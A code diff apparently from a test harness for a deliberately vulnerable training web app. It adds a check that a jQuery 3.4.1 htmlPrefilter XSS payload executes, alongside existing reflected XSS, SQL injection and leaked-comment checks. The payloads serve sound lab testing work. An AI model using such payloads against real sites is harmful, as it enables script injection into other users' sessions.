@@ -88,6 +88,11 @@ async function main() {
     await navigate(targetOrigin + '/search?q=' + encodeURIComponent('<script>document.body.dataset.xss="executed"</script>'),
       `document.body?.dataset.xss === 'executed'`);
     console.log('PASS: reflected XSS executes JavaScript in the target origin.');
+    const jqueryPayload = '<style><style/><img src=/missing-jquery-lab-image onerror="document.body.dataset.jqueryXss=\'executed\';document.querySelector(\'#result\').textContent=\'Payload executed\'">';
+    await navigate(targetOrigin + '/jquery?fragment=' + encodeURIComponent(jqueryPayload),
+      `document.body?.dataset.jqueryXss === 'executed'`);
+    assert.equal(await evaluate(`jQuery.fn.jquery`), '3.4.1');
+    console.log('PASS: jQuery 3.4.1 htmlPrefilter payload executes in the target origin.');
     await navigate(targetOrigin + '/login', `!!document.querySelector('input[name="password"]')`);
     await evaluate(`document.querySelector('input[name="username"]').value = 'admin';
       document.querySelector('input[name="password"]').value = 'LabOnly123!'; document.querySelector('form').requestSubmit()`);
@@ -119,7 +124,7 @@ async function main() {
     console.log('PASS: SQL injection exposes the hidden product.');
     await navigate(targetOrigin, `document.title.includes('Deliberately vulnerable')`);
     assert.equal(await evaluate(`(async () => { const html=await (await fetch('/')).text(); return html.includes('<!-- VULN-06:') && html.includes('DEMO-RESET-TOKEN-DO-NOT-USE'); })()`), true);
-    console.log('PASS: sensitive comments reach the browser. All six cases verified.');
+    console.log('PASS: sensitive comments reach the browser. All seven cases verified.');
     await send('Browser.close').catch(() => {});
   } finally {
     if (ws) ws.close();
